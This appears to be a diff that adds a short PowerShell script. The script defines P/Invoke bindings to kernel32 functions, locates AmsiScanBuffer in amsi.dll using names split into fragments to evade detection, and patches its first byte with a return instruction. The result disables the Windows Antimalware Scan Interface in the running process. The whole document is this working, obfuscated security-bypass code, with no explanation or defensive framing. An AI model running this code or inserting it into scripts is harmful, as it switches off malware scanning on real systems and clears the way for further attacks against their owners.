@@ -1,0 +1,7 @@
+$pinvoke_obj = 'using System;using System.Runtime.InteropServices;public class WinApi{[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string name);[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out int lpflOldProtect);}';Add-Type $pinvoke_obj
+$amsiDll = [WinApi]::LoadLibrary("a"+"ms"+"i.dl"+"l")
+$funcAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScanB"+"uf"+"fer")
+$output = 0
+[WinApi]::VirtualProtect($funcAddr, [uint32]1, 0x40, [ref] $output)
+[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xC3), 0, $funcAddr, 1)
+[WinApi]::VirtualProtect($funcAddr, [uint32]1, $output, [ref] $null)
